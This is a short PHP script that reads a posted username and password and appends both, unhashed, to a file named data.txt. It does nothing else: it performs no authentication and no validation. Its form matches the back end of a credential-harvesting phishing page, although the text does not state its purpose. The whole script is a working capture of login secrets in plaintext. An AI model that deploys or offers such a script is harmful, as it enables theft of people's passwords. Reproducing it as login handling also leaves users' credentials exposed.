<?php
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Open the data.txt file in append mode
    $file = fopen("data.txt", "a");

    // Write the username and password to the file
    fwrite($file, "Username: " . $username . ", Password: " . $password . "\n");

    // Close the file
    fclose($file);
}
?>
